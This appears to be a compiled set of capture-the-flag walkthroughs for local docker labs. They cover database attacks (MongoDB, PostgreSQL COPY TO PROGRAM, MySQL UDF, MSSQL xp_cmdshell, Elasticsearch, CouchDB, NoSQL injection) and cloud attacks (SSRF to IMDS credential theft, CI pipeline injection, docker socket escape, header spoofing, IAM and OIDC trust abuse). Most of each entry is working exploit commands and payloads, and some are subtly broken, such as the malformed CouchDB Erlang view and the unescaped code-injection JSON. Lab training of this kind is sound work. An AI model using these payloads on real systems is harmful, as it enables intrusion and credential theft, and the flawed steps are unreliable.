| Path | docker/db/mongodb-unauth/ |
| Type | docker |
| Database | MongoDB 7.0 |

#### Attack Path Summary
```
Connect to MongoDB without authentication → List databases → Query flags.flag_collection → Retrieve flag document
```

#### Prerequisites

##### Knowledge
- MongoDB connection basics: Understanding how to connect to a MongoDB instance using `mongosh` and specify host/port parameters
- NoSQL database enumeration: Listing databases and collections to discover where data is stored
- Document query syntax: Using `find()` with filters and `pretty()` for readable output in MongoDB

##### Tools
- mongosh: MongoDB Shell client for connecting to and querying MongoDB instances
- MongoDB Compass: GUI client for visual exploration of MongoDB databases and collections

#### Step-by-Step Exploitation

##### Step 1: Connect to MongoDB

Connect to the target MongoDB instance using `mongosh`. Since authentication is disabled, no credentials are required.

```bash
mongosh --host localhost --port 10206
```

##### Step 2: List Available Databases

Once connected, list all databases to discover what is available.

```javascript
show dbs
```

Expected output includes a database named `flags` (or similar).

##### Step 3: Switch to the Flags Database

Select the database containing the flag.

```javascript
use flags
```

##### Step 4: List Collections

List all collections within the `flags` database.

```javascript
show collections
```

Expected output includes `flag_collection`.

##### Step 5: Query the Flag Document

Retrieve all documents from the flag collection to read the flag.

```javascript
db.flag_collection.find().pretty()
```

The flag is displayed as a field in one of the returned documents.

##### Step 6: Direct One-Liner

The entire attack can be performed in a single command:

```bash
mongosh --host localhost --port 10206 --quiet --eval 'db.getSiblingDB("flags").flag_collection.find().pretty()'
```

#### Flag Location
- Stored as a field in a document within the `flags.flag_collection` collection
- Accessible without authentication due to disabled access control

#### Verification Commands
```bash
mongosh --host localhost --port 10206 --quiet --eval 'db.getSiblingDB("flags").flag_collection.findOne()' | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### DB-01: PostgreSQL Weak Auth RCE

| Property | Value |
|----------|-------|
| Technique | COPY PROGRAM |
| Difficulty | L2 |
| Port | 10201 |
| Credentials | postgres / password123 |

#### Attack Path
```
Brute-force postgres:password123 → Connect as superuser → COPY ... FROM PROGRAM → RCE → /flag.txt
```

```bash
## Connect with weak credentials
psql -h localhost -p 10201 -U postgres -d postgres
## Password: password123

## Execute OS command via COPY PROGRAM
COPY (SELECT '') TO PROGRAM 'cat /flag.txt';
## flag{db-01-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### DB-02: MySQL Weak Auth UDF

| Property | Value |
|----------|-------|
| Technique | MySQL UDF |
| Difficulty | L2 |
| Port | 10202 |
| Credentials | root / password123 |

#### Attack Path
```
Connect as root → Write UDF .so to plugin_dir → CREATE FUNCTION → sys_exec → /flag.txt
```

```bash
mysql -h localhost -P 10202 -u root -ppassword123

## Check plugin directory
SELECT @@plugin_dir;

## Write UDF library and execute
SELECT sys_exec('cat /flag.txt');
## flag{db-02-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### DB-03: Oracle TNS Poisoning

| Property | Value |
|----------|-------|
| Technique | TNS Poisoning |
| Difficulty | L3 |
| Port | 10203 |
| SID | XE |
| Credentials | system / password123 |

#### Attack Path
```
TNS Listener poisoning → MITM → Capture DB credentials → Connect → UTL_FILE → /flag.txt
```

```bash
## TNS poisoning attack against Oracle listener on port 10203
## Use tnscmd or custom TNS packet injection
## Redirect client connection through attacker-controlled proxy
## Capture credentials, then connect:
sqlplus system/password123@localhost:10203/XE
SELECT * FROM flag_table;
## flag{db-03-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### DB-04: MSSQL Linked Server Lateral Movement

| Property | Value |
|----------|-------|
| Technique | MSSQL Linked Server |
| Difficulty | L3 |
| Low-Priv Port | 10204 |
| Target Port | 10214 |

#### Attack Path
```
Connect to low-priv MSSQL → Enumerate linked servers → OPENQUERY to target → xp_cmdshell on target → /flag.txt
```

```bash
## Connect to low-priv instance
sqlcmd -S localhost,10204 -U sa -P 'Password123!'

## Enumerate linked servers
SELECT name FROM sys.servers;

## Execute via linked server to target (runs on the target server)
SELECT * FROM OPENQUERY([TARGET], 'EXEC xp_cmdshell ''type C:\flag.txt''');
## flag{db-04-xxxxxxxxxxxxxxxx}
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### DB-07: Elasticsearch Script Injection

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Unauthenticated Access + Painless Script Injection) |
| Difficulty | L2 |
| Port | 10207 |
| Path | docker/db/elasticsearch-script/ |
| Type | docker |
| Database | Elasticsearch 8.11.0 |

#### Attack Path Summary
```
Access unauthenticated Elasticsearch REST API → List indices → Discover hidden_config index → Retrieve flag via GET request → Demonstrate painless script_fields injection
```

#### Prerequisites

##### Knowledge
- Elasticsearch REST API: Understanding HTTP endpoints for querying indices, documents, and cluster information
- Index enumeration: Discovering hidden or non-public indices via the `_cat/indices` and `_aliases` API endpoints
- Painless scripting: Using Elasticsearch's Painless scripting language in `script_fields` to extract data dynamically
- Elasticsearch query DSL: Constructing JSON request bodies for search and field retrieval

##### Tools
- curl: Sending HTTP requests to the Elasticsearch REST API

#### Step-by-Step Exploitation

##### Step 1: Check Cluster Health

Verify the Elasticsearch instance is accessible and responsive.

```bash
curl -s http://localhost:10207/
```

##### Step 2: List All Indices

Enumerate all indices in the cluster, including hidden or system indices.

```bash
curl -s http://localhost:10207/_cat/indices?v
```

Expected output includes indices such as `hidden_config`, `movies`, or other application-specific indices.

##### Step 3: Retrieve Documents from hidden_config

Query the `hidden_config` index to retrieve all documents.

```bash
curl -s http://localhost:10207/hidden_config/_search?pretty
```

If the flag is directly in the response, extract it. If not, query all documents:

```bash
curl -s -X POST http://localhost:10207/hidden_config/_search?pretty \
  -H "Content-Type: application/json" \
  -d '{"query": {"match_all": {}}}'
```

##### Step 4: Extract Flag via Painless Script Injection

If the flag is obfuscated or stored in a computed field, use Painless `script_fields` to extract or derive it.

```bash
curl -s -X POST http://localhost:10207/hidden_config/_search?pretty \
  -H "Content-Type: application/json" \
  -d '{
    "query": {"match_all": {}},
    "script_fields": {
      "extracted_flag": {
        "script": {
          "lang": "painless",
          "source": "doc[\"flag\"].value"
        }
      }
    }
  }'
```

##### Step 5: Demonstrate Painless Script Injection for RCE

If the cluster has scripting enabled, demonstrate arbitrary code execution via Painless:

```bash
curl -s -X POST http://localhost:10207/_scripts/painless_execute?pretty \
  -H "Content-Type: application/json" \
  -d '{
    "script": {
      "lang": "painless",
      "source": "Runtime.getRuntime().exec(\"cat /flag.txt\")"
    }
  }'
```

#### Flag Location
- Stored as a field in the `hidden_config` index in Elasticsearch
- Accessible via REST API without authentication

#### Verification Commands
```bash
curl -s -X POST http://localhost:10207/hidden_config/_search -H "Content-Type: application/json" -d '{"query":{"match_all":{}}}' | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### DB-08: CouchDB Arbitrary Command Execution

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Admin Party Mode + Erlang Native View RCE) |
| Difficulty | L2 |
| Port | 10208 |
| Path | docker/db/couchdb-rce/ |
| Type | docker |
| Database | CouchDB 3.3.3 |

#### Attack Path Summary
```
Discover CouchDB in admin party mode (no auth required) → Create database → Upload Erlang design document with file:read_file() → Query the view → Read /flag.txt
```

#### Prerequisites

##### Knowledge
- CouchDB REST API: Understanding HTTP endpoints for database and document CRUD operations
- Admin Party mode: CouchDB's default configuration that allows full administrative access without authentication
- Erlang native views: CouchDB supports views written in Erlang (instead of JavaScript) that can access the Erlang standard library including file I/O functions
- Design documents: CouchDB design documents define views and other server-side logic

##### Tools
- curl: Sending HTTP requests to the CouchDB REST API

#### Step-by-Step Exploitation

##### Step 1: Verify CouchDB is Running and Accessible

Check the CouchDB root endpoint to confirm the service is available.

```bash
curl http://localhost:10208/
```

##### Step 2: Confirm Admin Party Mode

Check the `_session` endpoint to verify that no authentication is required (admin party mode).

```bash
curl http://localhost:10208/_session
```

Expected response includes `"authenticated": "default"` or similar indicating no auth is needed.

##### Step 3: Get Server Information

Retrieve detailed server information.

```bash
curl http://localhost:10208/
```

##### Step 4: Create a Database

Create a new database to hold the exploit design document.

```bash
curl -X PUT http://localhost:10208/exploitdb
```

Expected response: `{"ok":true}`

##### Step 5: Create Erlang Design Document with RCE

Upload a design document containing an Erlang native view that reads `/flag.txt` using `file:read_file()`.

```bash
curl -X PUT http://localhost:10208/exploitdb/_design/exploit \
  -H "Content-Type: application/json" \
  -d '{
    "_id": "_design/exploit",
    "language": "erlang",
    "views": {
      "readflag": {
        "map": "fun({Doc}) -> <<<<<<(fun()-> {ok, Bin} = file:read_file(\"/flag.txt\"), Bin end)()>>>>> end"
      }
    }
  }'
```

Note: The Erlang map function syntax may vary. The key is that CouchDB's Erlang view server evaluates the Erlang code with full filesystem access.

##### Step 6: Query the Malicious View

Trigger the Erlang view execution to read the flag file.

```bash
curl -X GET http://localhost:10208/exploitdb/_design/exploit/_view/readflag
```

The flag file content appears in the view result output.

##### Step 7: Alternative — Simpler Erlang View Payload

If the above Erlang syntax is not accepted, try an alternative form:

```bash
curl -X PUT http://localhost:10208/exploitdb/_design/exploit \
  -H "Content-Type: application/json" \
  -d '{
    "_id": "_design/exploit",
    "language": "erlang",
    "views": {
      "readflag": {
        "map": "fun({Doc}) -> Emit = fun(Key, Value) -> ok end, {ok, Bin} = file:read_file(\"/flag.txt\"), Emit(0, binary_to_list(Bin)) end"
      }
    }
  }'
```

#### Flag Location
- `/flag.txt` on the CouchDB container filesystem
- Read via Erlang `file:read_file()` through a native view

#### Verification Commands
```bash
curl -s http://localhost:10208/exploitdb/_design/exploit/_view/readflag | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### DB-09: MongoDB NoSQL Injection

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | NoSQL Injection (MongoDB $ne Operator) |
| Difficulty | L2 |
| Port | 10209 |
| Path | docker/db/mongodb-nosqli/ |
| Type | docker |
| Database | MongoDB 7.0 + Python Flask |

#### Attack Path Summary
```
Identify JSON login endpoint → Inject $ne operator to bypass password check → Authentication bypass → Retrieve admin user document containing flag
```

#### Prerequisites

##### Knowledge
- NoSQL injection principles: Understanding how JSON-based injection differs from SQL injection, particularly with MongoDB query operators
- MongoDB query operators: Knowledge of `$ne` (not equal), `$gt` (greater than), `$regex`, and other operators that match all documents
- JSON injection: Injecting MongoDB operators into JSON request bodies to manipulate query logic
- Flask/Python web applications: Understanding how Python web apps parse JSON request bodies and pass them directly to MongoDB queries

##### Tools
- curl: Sending crafted JSON POST requests to the login endpoint
- Burp Suite: Intercepting requests, replaying them, and using Repeater for iterative testing

#### Step-by-Step Exploitation

##### Step 1: Access the Login Page

Open the application login page to understand the authentication mechanism.

```bash
curl http://localhost:10209/
```

##### Step 2: Test Normal Login

Attempt a login with random credentials to confirm the endpoint exists and understand the expected request format.

```bash
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'
```

Expected response: `{"error": "Invalid credentials"}` or similar.

##### Step 3: Inject $ne to Bypass Password

Send a JSON payload where the `password` field is a MongoDB `$ne` (not equal) operator injected as an object. This transforms the server-side query from:

```javascript
db.users.findOne({username: "admin", password: "attacker_input"})
```

into:

```javascript
db.users.findOne({username: "admin", password: {"$ne": ""}})
```

Since `$ne: ""` matches any document where the password is not equal to an empty string (which is always true for non-empty passwords), the query returns the admin user without knowing the actual password.

```bash
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'
```

##### Step 4: Retrieve the Flag

If the login succeeds, the flag is returned in the response body (either directly as a field in the user document or in a session token).

```json
{"message": "Login successful", "flag": "flag{db-09-xxxxxxxxxxxxxxxx}", "user": "admin"}
```

##### Step 5: Try Other Operators if $ne is Filtered

If `$ne` is blocked by input validation, try alternative operators:

```bash
## $gt — matches any value greater than empty string (all non-empty strings)
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'

## $regex — matches any string pattern
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":".*"}}'

## $exists — matches documents where password field exists
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$exists":true}}'
```

##### Step 6: Extract All Users via $ne on Username

If the flag is not in the admin document directly, enumerate all users by bypassing both fields:

```bash
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```

This returns the first user matching any non-empty credentials, potentially revealing all users.

##### Step 7: Blind Extraction via Boolean-Based NoSQL Injection

If the application returns different responses for valid vs. invalid conditions, perform blind extraction of the password hash or flag character by character using `$regex`:

```bash
## Test if password starts with 'f'
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^f"}}'

## Test if password starts with 'fl'
curl -X POST http://localhost:10209/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^fl"}}'
```

Each request that returns a success response indicates the regex pattern matched.

#### Flag Location
- Stored as a field within the admin user document in MongoDB
- Retrieved by bypassing authentication via NoSQL injection and reading the returned user document

#### Verification Commands
```bash
curl -s -X POST http://localhost:10209/login -H "Content-Type: application/json" -d '{"username":"admin","password":{"$ne":""}}' | grep -o 'flag{[^}]*}'
```

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-01: SSRF to IMDS Credential Theft

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (SSRF → IMDS) |
| Difficulty | L2 |
| Port | 10601 |
| Path | docker/cloud/ssrf-to-imds |
| Type | docker |
| Flag | flag{cloud-01-imds-s3} (S3 object, requires IMDS credentials) |

### Attack Path Summary
nmap discover → SSRF endpoint found → IMDS enumeration → IAM role discovery → credential theft → S3 access → flag

### Prerequisites
#### Knowledge
- EC2 Instance Metadata Service (IMDS) protocol (169.254.169.254)
- IMDSv1 vs IMDSv2 authentication differences
- AWS IAM Role credential format (AccessKeyId, SecretAccessKey, SessionToken)
- SSRF exploitation techniques

#### Tools
- nmap: Service discovery
- curl: HTTP requests and SSRF exploitation

### Step-by-Step Exploitation
#### Step 1: Service Discovery
nmap -sV localhost reveals port 10601 (Werkzeug httpd), port 10701 (ec2-imds proxy), port 10704 (s3-storage proxy).

#### Step 2: Find SSRF Endpoint
```bash
curl "http://localhost:10601/fetch?url=http://example.com"
```
Returns remote page content — confirms server-side URL fetching.

#### Step 3: Enumerate IMDS via SSRF
```bash
curl "http://localhost:10601/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://localhost:10601/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
## Returns: ec2-role
```

#### Step 4: Steal IAM Credentials
```bash
curl "http://localhost:10601/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
## Returns JSON with AccessKeyId, SecretAccessKey, Token
```

#### Step 5: Use Credentials to Access S3
```bash
curl -H "X-Access-Key-Id: AKIACLOUD01EXAMPLE" \
     -H "X-Secret-Access-Key: cloud01-imds-secret-key" \
     http://169.254.0.20:5000/
## Returns: {"objects":["flag.txt"]}
```

### Flag Location
- S3 simulator object `flag.txt`, accessible with stolen IMDS credentials

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-04: Lambda Code Injection → IAM PassRole

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (command injection + IAM privesc) |
| Difficulty | L2 |
| Port | 10604 |
| Path | docker/cloud/lambda-passrole |
| Type | docker |
| Flag | flag{cloud-04-lambda-passrole} (AdminRole credentials after PassRole escalation) |

### Attack Path Summary
nmap discover → API Gateway injection → Lambda env leak → IAM role enumeration → PassRole to AdminRole → flag

### Prerequisites
#### Knowledge
- AWS Lambda execution model and Execution Role
- STS AssumeRole mechanism
- IAM PassRole permission semantics
- Environment variable credential injection in cloud services

#### Tools
- nmap: Service discovery
- curl: API requests and code injection

### Step-by-Step Exploitation
#### Step 1: Service Discovery
nmap -sV reveals port 10604 (Werkzeug httpd), port 10702 (aws-sts proxy), port 10705 (lambda proxy).

#### Step 2: Code Injection via API Gateway
```bash
curl -X POST http://localhost:10604/invoke \
  -H "Content-Type: application/json" \
  -d '{"code": "__import__("os").system("env")"}'
```
#### Step 3: Extract Lambda Execution Role Credentials
Response contains IAM_ACCESS_KEY_ID and IAM_SECRET_KEY from Lambda environment.

#### Step 4: Enumerate IAM Roles
```bash
curl http://localhost:10604/step1  # (via attacker proxy to IAM /roles)
## Returns role list including AdminRole with s3:* + iam:* permissions
```

#### Step 5: PassRole to AdminRole
Use Lambda credentials to AssumeRole to AdminRole — Lambda has PassRole permission:
```bash
curl -X POST http://iam:5000/ \
  -d "Action=AssumeRole&RoleArn=arn:aws:iam::000000000000:role/AdminRole&RoleSessionName=passrole-attack&AccessKeyId=<LAMBDA_KEY>&SecretAccessKey=<LAMBDA_SECRET>"
```
#### Step 6: Access Flag
Flag is returned in the AssumeRole response credentials.

### Flag Location
- In AdminRole temporary credentials, obtained via Successful PassRole + AssumeRole

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-06: Managed DB COPY FROM PROGRAM → IMDS Access

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (SQLi + PostgreSQL COPY FROM PROGRAM) |
| Difficulty | L2 |
| Port | 10606 |
| Path | docker/cloud/db-to-imds |
| Type | docker |
| Flag | flag{cloud-06-db-imds} (via IMDS credential access) |

### Attack Path Summary
nmap discover → SQL injection found → PostgreSQL enumeration → COPY FROM PROGRAM OS exec → IMDS access → credential theft → flag

### Prerequisites
#### Knowledge
- PostgreSQL COPY FROM PROGRAM command execution
- SQL injection exploitation (stacked queries)
- EC2 IMDS access from managed database instances

#### Tools
- nmap: Service discovery
- curl: SQL injection and HTTP requests

### Step-by-Step Exploitation
#### Step 1: Discover SQL Injection
```bash
curl "http://localhost:10606/query?sql=SELECT%20version()"
## Returns PostgreSQL version — confirms SQLi
```

#### Step 2: Enumerate Database
```bash
curl "http://localhost:10606/query?sql=SELECT%20current_user,current_database()"
## Confirms superuser access
```

#### Step 3: COPY FROM PROGRAM — OS Command Execution
```bash
curl "http://localhost:10606/query?sql=COPY+(SELECT+'')+TO+PROGRAM+'curl+http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role'"
```

#### Step 4: Use Stolen IMDS Credentials
Credentials from IMDS can be used to access protected cloud resources.

### Flag Location
- IMDS credential response for ec2-role, accessed via SQL injection COPY FROM PROGRAM

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-05: CloudFormation Template Injection → SSM Parameter Leak

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (CloudFormation Fn::Sub injection) |
| Difficulty | L2 |
| Port | 10605 |
| Path | docker/cloud/cf-injection |
| Type | docker |
| Flag | flag{cloud-05-cf-injection} (SSM /secure/flag parameter) |

### Attack Path Summary
console access → view available exports → infer SSM path convention → craft CF template with Fn::Sub → SSM parameter resolved → flag

### Prerequisites
#### Knowledge
- AWS CloudFormation intrinsic functions (Fn::Sub, Ref, Fn::ImportValue)
- AWS SSM Parameter Store hierarchy and naming conventions
- YAML template syntax

#### Tools
- nmap: Service discovery
- curl: Template submission

### Step-by-Step Exploitation
#### Step 1: Explore CloudFormation Console
Access http://localhost:10605 — view available CloudFormation Exports:
```
AppDatabasePassword → /secure/app/db-password
AppApiKey → /secure/app/api-key
```
These reveal the SSM parameter naming convention (/secure/...).

#### Step 2: Infer Flag Parameter Path
Based on export naming pattern, the flag parameter likely follows the same convention: `/secure/flag`.

#### Step 3: Inject Fn::Sub in CloudFormation Template
```yaml
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  MyBucket:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Sub ${/secure/flag}
```
#### Step 4: Retrieve Resolved Value
Parser resolves `${/secure/flag}` against SSM Parameter Store and returns the flag in the stack output.

### Flag Location
- SSM Parameter Store `/secure/flag`, resolved via CloudFormation Fn::Sub

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-07: S3 Bucket Monopoly → Public Bucket Discovery

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (S3 public bucket misconfiguration) |
| Difficulty | L2 |
| Port | 10607 |
| Path | docker/cloud/s3-monopoly |
| Type | docker |
| Flag | flag{cloud-07-s3-monopoly} (in public bucket demo-app-assets/flag.txt) |

### Attack Path Summary
S3 Explorer access → enumerate global bucket list → discover demo-app-assets → public access (no auth) → read flag.txt → flag

### Prerequisites
#### Knowledge
- AWS S3 global namespace architecture
- S3 bucket ACLs and public-access settings
- Bucket enumeration techniques

#### Tools
- nmap: Service discovery
- curl: S3 API requests

### Step-by-Step Exploitation
#### Step 1: Enumerate Buckets
Access S3 Explorer at http://localhost:10607. Use Step 1 to list all buckets in the global namespace:
```bash
curl http://s3-sim:5000/
## Returns: {"buckets": ["demo-app-assets", "dev-logs"]}
```

#### Step 2: Explore Target Bucket
```bash
curl http://s3-sim:5000/buckets/demo-app-assets
## Returns: {"name": "demo-app-assets", "owner": "victim", "objects": ["flag.txt", "readme.txt"]}
```
Bucket is owned by "victim" but has no access restrictions (public-read).

#### Step 3: Read Flag Object
```bash
curl http://s3-sim:5000/buckets/demo-app-assets/flag.txt
## Returns flag — no authentication required
```

### Flag Location
- Object `flag.txt` in the publicly-accessible bucket `demo-app-assets`

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-08: CI/CD Pipeline Poisoning → Credential Exfiltration

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (CI/CD pipeline injection) |
| Difficulty | L2 |
| Port | 10608 |
| Path | docker/cloud/ci-poisoning |
| Type | docker |
| Flag | flag{cloud-08-pipeline} (ci-runner environment, via pipeline injection) |

### Attack Path Summary
CI console access → explore git repo → read CI workflow → identify injection point → submit malicious build → env leak → flag

### Prerequisites
#### Knowledge
- CI/CD pipeline architecture (GitHub Actions, CodeBuild)
- Shell injection techniques
- Pipeline configuration analysis (.github/workflows/ci.yml)

#### Tools
- nmap: Service discovery
- curl: Build submission and repo exploration

### Step-by-Step Exploitation
#### Step 1: Explore Repository Structure
Access CI/CD Console at http://localhost:10608. Use Step 1 to explore the git repository:
- `.github/workflows/ci.yml` — CI pipeline definition
- `src/build.sh` — Build script using APP_NAME env var
- `src/test.sh` — Test script

#### Step 2: Analyze Workflow Configuration
Read `ci.yml` to understand the pipeline steps. The build step runs `bash src/build.sh` with `APP_NAME` env var — an injection point.

#### Step 3: Submit Malicious Build Script
```bash
curl -X POST http://localhost:10608/step3 \
  -d "script=env | grep FLAG; cat /etc/flag.txt 2>/dev/null"
```
The build output includes environment variables and flag from the ci-runner container.

### Flag Location
- ci-runner environment variable FLAG, accessible via pipeline shell injection

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-09: AI Notebook Escape → K8s SA Token Theft

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (Docker socket escape) |
| Difficulty | L3 |
| Port | 10609 |
| Path | docker/cloud/notebook-escape |
| Type | docker |
| Flag | flag{cloud-09-notebook} (hostPath mount, requires Docker socket escape) |

### Attack Path Summary
notebook access → explore environment (Step 1) → discover docker.sock → Docker socket escape → read host flag → flag

### Prerequisites
#### Knowledge
- Docker socket (/var/run/docker.sock) container escape technique
- Container runtime isolation and privilege boundaries
- K8s ServiceAccount token discovery

#### Tools
- nmap: Service discovery
- curl: Code execution in notebook

### Step-by-Step Exploitation
#### Step 1: Explore Notebook Environment
Access the AI Notebook at http://localhost:10609. Use Step 1 to explore:
```python
import os
print(os.listdir('/var/run'))  # Discover docker.sock
print(os.listdir('/host'))      # Discover hostPath mount with flag
```

#### Step 2: Docker Socket Escape
The mounted docker.sock allows creating privileged containers or accessing the host filesystem:
```python
## Direct host path access via mount
with open('/host/flag.txt') as f:
    print(f.read())
```

### Flag Location
- Host filesystem `/host/flag.txt`, accessible via Docker socket escape or hostPath mount

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-10: API Gateway Header Smuggling → Admin Access

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (X-Forwarded-For spoofing) |
| Difficulty | L2 |
| Port | 10610 |
| Path | docker/cloud/gateway-smuggling |
| Type | docker |
| Flag | flag{cloud-10-gateway-admin} (admin /secrets endpoint) |

### Attack Path Summary
robots.txt discovery → /admin 403 → error analysis reveals IP check → X-Forwarded-For bypass → admin secrets → flag

### Prerequisites
#### Knowledge
- HTTP header handling in reverse proxies
- X-Forwarded-For header semantics and trust model
- API Gateway IP whitelist mechanisms

#### Tools
- nmap: Service discovery
- curl: HTTP requests with custom headers

### Step-by-Step Exploitation
#### Step 1: Discover Hidden Endpoint
```bash
curl http://localhost:10610/robots.txt
## Returns: Disallow: /admin
```

#### Step 2: Attempt Direct Access
```bash
curl http://localhost:10610/admin
## Returns: 403 — "Access denied — X.X.X.X is not an internal IP"
## Error reveals: "Only internal IPs (10.x, 172.x, 127.0.0.1) are allowed"
```

#### Step 3: Bypass with X-Forwarded-For
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://localhost:10610/admin
## Returns admin secrets including flag
```

### Flag Location
- Admin service `/secrets` endpoint, accessible only after X-Forwarded-For bypass

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-11: OIDC Claim Mismatch → Cross-Repo AssumeRole

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (OIDC federation misconfiguration) |
| Difficulty | L3 |
| Port | 10611 |
| Path | docker/cloud/oidc-federation |
| Type | docker |
| Flag | In STS AssumeRoleWithWebIdentity response credentials |

### Attack Path Summary
discover orgs (Step 1) → try exact sub (Step 2) → IdP validates → try wildcard sub → IdP skips validation → AssumeRoleWithWebIdentity (Step 3) → flag

### Prerequisites
#### Knowledge
- OIDC federation protocol and JWT claims (sub, aud, iss)
- AWS IAM OIDC Identity Provider and trust policy conditions
- STS AssumeRoleWithWebIdentity API
- StringLike vs StringEquals condition operators

#### Tools
- nmap: Service discovery (oidc-idp on 10703, aws-sts on 10702)
- curl: OIDC token request and STS API calls

### Step-by-Step Exploitation
#### Step 1: Discover Organizations
Use the OIDC Console Step 1 to list known GitHub organizations from the IdP:
```bash
curl http://oidc:5000/orgs
## Returns: {"demo-org": ["demo-repo", "demo-api"], "prod-org": [...]}
```

#### Step 2: Request JWT with Exact Sub
Try a precise sub claim that matches a known repo:
```bash
curl -X POST http://oidc:5000/token -H "Content-Type: application/json" \
  -d '{"sub": "repo:demo-org/demo-repo:ref:refs/heads/main", "aud": "sts.amazonaws.com"}'
## IdP validates and returns JWT
```

#### Step 3: Request JWT with Wildcard Sub
The IdP skips validation when sub contains wildcards. Try broader access:
```bash
curl -X POST http://oidc:5000/token -H "Content-Type: application/json" \
  -d '{"sub": "repo:demo-org/*:ref:*", "aud": "sts.amazonaws.com"}'
## IdP returns JWT (skips wildcard validation)
```

#### Step 4: Assume Role with Forged JWT
```bash
curl -X POST http://iam:5000/ \
  -d "Action=AssumeRoleWithWebIdentity&RoleArn=arn:aws:iam::000000000000:role/GitHubActionsRole&WebIdentityToken=<JWT>&RoleSessionName=attack"
```
The IAM trust policy's StringLike condition matches the wildcard sub, granting access.

### Flag Location
- In the AssumeRoleWithWebIdentity response credentials

---

---

<!-- source: cve_challenges/docs/scenarios/docker-scenarios-exploitation.md -->

### CLOUD-12: IAM Trust Policy Principal:* → Cross-Account Takeover

#### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | N/A (IAM trust policy misconfiguration) |
| Difficulty | L2 |
| Port | 10612 |
| Path | docker/cloud/cross-account-trust |
| Type | docker |
| Flag | flag{cloud-12-cross-account} (S3 /flag.txt, requires CrossAccountRole creds) |

### Attack Path Summary
list roles (Step 1) → get role trust policy (Step 2) → identify cross-account trust → AssumeRole (Step 3) → use creds to access S3 (Step 4) → flag

### Prerequisites
#### Knowledge
- AWS IAM trust policy syntax (Principal, Action, Condition)
- Cross-account AssumeRole mechanism
- IAM role enumeration via ListRoles/GetRole

#### Tools
- nmap: Service discovery (aws-sts on 10702, s3-storage on 10704)
- curl: IAM API calls and S3 access

### Step-by-Step Exploitation
#### Step 1: List IAM Roles
Use the Cross-Account Console Step 1 to enumerate roles:
```bash
curl http://iam:5000/roles
## Returns all roles with descriptions — CrossAccountRole trusts external accounts
```

#### Step 2: Get Role Trust Policy
Step 2 reveals CrossAccountRole's trust policy: `Principal: "arn:aws:iam::*:root"` — allows any principal from external accounts.

#### Step 3: Assume Cross-Account Role
Use low-privilege credentials to AssumeRole:
```bash
curl -X POST http://iam:5000/ \
  -d "Action=AssumeRole&RoleArn=arn:aws:iam::111111111111:role/CrossAccountRole&RoleSessionName=attack&AccessKeyId=AKIAATTACKEREXAMPLE&SecretAccessKey=attacker-secret-key"
## Returns temporary credentials for CrossAccountRole
```

#### Step 4: Access S3 with Credentials
```bash
curl -H "X-Access-Key-Id: <ASIA...>" \
     -H "X-Secret-Access-Key: <temp-sk-...>" \
     -H "X-Session-Token: <FwoG...>" \
     http://s3:5000/flag.txt
```

### Flag Location
- S3 `/flag.txt`, requires valid CrossAccountRole temporary credentials

---

---

